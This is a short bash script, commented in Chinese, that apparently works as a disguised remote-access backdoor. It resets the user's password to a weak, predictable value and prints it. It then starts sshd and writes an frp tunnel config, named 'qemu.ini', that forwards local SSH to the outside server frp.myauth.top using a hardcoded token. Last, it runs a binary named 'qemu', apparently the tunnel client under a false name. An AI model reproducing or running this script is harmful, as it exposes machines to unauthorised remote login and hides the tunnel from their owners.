#!/bin/bash

# 生成随机数作为密码的一部分
RANDOM_0=${RANDOM}
PASSWORD="gG${RANDOM_0}${RANDOM_0}"

# 设置密码
printf "设置密码：$PASSWORD\n"
printf "$PASSWORD\n$PASSWORD\n" | passwd $USER

# 检查密码设置是否成功
if [ $? -ne 0 ]; then
    echo "设置密码失败"
    exit 1
fi

# 启动 sshd，并记录日志
printf "启动 SSH 服务...\n"
nohup /usr/sbin/sshd -D > /var/log/sshd.log 2>&1 &

# 检查 SSH 服务是否成功启动
sleep 2
if ! pgrep -x "sshd" > /dev/null; then
    echo "启动 SSH 服务失败"
    exit 1
fi
CONFIG_FILE="/usr/local/src/qemu/qemu.ini"

# generate config
cat >${CONFIG_FILE} <<EOF
[common]
server_addr = frp.myauth.top
server_port = 7000
token = hxSoC6lWW6lTR8O64Xqy0tl6BcSYK5Zx5I3BjaO

[ssh_root_$(hostname)_${RANDOM_0}]
type = tcp
local_ip = 127.0.0.1
local_port = 22
EOF

# 检查配置文件是否成功生成
if [ ! -f "$CONFIG_FILE" ]; then
    echo "生成配置文件失败"
    exit 1
fi
# 启动主进程 ，并记录日志
printf "启动主进程...\n"
exec /usr/local/src/qemu/qemu -c /usr/local/src/qemu/qemu.ini